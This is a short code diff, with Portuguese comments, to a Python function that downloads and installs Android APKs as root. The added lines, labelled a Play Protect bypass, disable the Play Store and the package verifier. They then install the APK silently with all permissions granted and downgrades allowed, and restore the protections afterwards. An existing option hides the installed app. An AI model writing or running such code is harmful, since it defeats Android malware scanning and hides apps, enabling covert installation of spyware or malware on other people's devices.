@@ -41,7 +41,19 @@ def install_apk(url, visibility):
         
         if pkg_name:
             app_name = get_app_name(tmp_path, pkg_name)
-            run_su(f"pm install -r {tmp_path}")
+            
+            # --- INÍCIO DO BYPASS DO PLAY PROTECT ---
+            # 1. Desativa a Google Play Store (mata o processo do Play Protect)
+            run_su("pm disable-user --user 0 com.android.vending > /dev/null 2>&1")
+            run_su("settings put global package_verifier_enable 0")
+            
+            # 2. Instala o APK de forma silenciosa com todas as permissões concedidas (-g) e permitindo downgrade (-d)
+            run_su(f"pm install -r -g -d {tmp_path}")
+            
+            # 3. Reativa a Play Store
+            run_su("settings put global package_verifier_enable 1")
+            run_su("pm enable com.android.vending > /dev/null 2>&1")
+            # --- FIM DO BYPASS ---
             
             if visibility == "oculto":
                 run_su(f"pm hide {pkg_name}")
